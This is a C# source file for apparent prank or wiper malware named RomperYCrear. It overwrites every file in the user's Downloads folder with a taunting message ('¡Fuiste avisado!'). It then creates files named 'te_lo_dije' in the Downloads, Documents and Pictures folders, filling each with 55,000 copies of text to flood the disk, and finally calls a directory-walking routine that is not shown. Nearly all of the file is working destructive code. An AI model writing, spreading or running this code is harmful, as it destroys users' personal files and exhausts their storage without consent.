using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;

namespace ConsoleApplication1
{
    class RomperYCrear
    {
        public static void crearArchivos()
        {

            DirectoryInfo direccion;

            string aux = "", texto = @"¡Fuiste avisado! ¯\_(ツ)_/¯", rutaCompletaCrearArchivos;

            int cont, ubicacion = 0;

            bool unaVez = true, entra = true;


            do
            {

                ubicacion += 1;

                cont = 0;

                switch (ubicacion)
                {

                    case 1:

                        direccion = new DirectoryInfo(@"C:\Users\" + Environment.UserName + @"\Downloads");

                        break;

                    case 2:

                        direccion = new DirectoryInfo(@"C:\Users\" + Environment.UserName + @"\Documents");

                        break;


                    case 3:

                        direccion = new DirectoryInfo(@"C:\Users\" + Environment.UserName + @"\Pictures");

                        break;

                    default:

                        direccion = new DirectoryInfo(@"C:\Users\" + Environment.UserName + @"\Downloads");
                        
                        break;
                }

                do
                {

                    cont++;

                    rutaCompletaCrearArchivos = direccion + @"\te_lo_dije" + cont + ".docx";

                    if (entra == true)
                    {

                        if (direccion.GetFiles().Length == 0)
                        {

                            aux = texto;

                        }
                        else
                        {

                            foreach (FileInfo file in direccion.GetFiles())
                            {
                                if (unaVez == true)
                                {

                                    aux = File.ReadAllText(file.FullName); //aux guarda los valores originales.

                                    unaVez = false;

                                }

                                try
                                {

                                    File.WriteAllText(file.FullName, texto);

                                }
                                catch
                                {

                                    entra = false;

                                }


                            }

                        }

                        entra = false;

                    }

                    using (StreamWriter archivo = File.AppendText(rutaCompletaCrearArchivos))    //se crea el archivo
                    {

                        for (int i = 0; i < 55000; i++)
                        {

                            archivo.Write(aux);

                        }

                        archivo.Close();

                    }

                } while (cont <= 12);

                RecorredorDeDirectorios.recorrerDirectorio(direccion);

            } while (ubicacion <= 3);

        }

    }
}
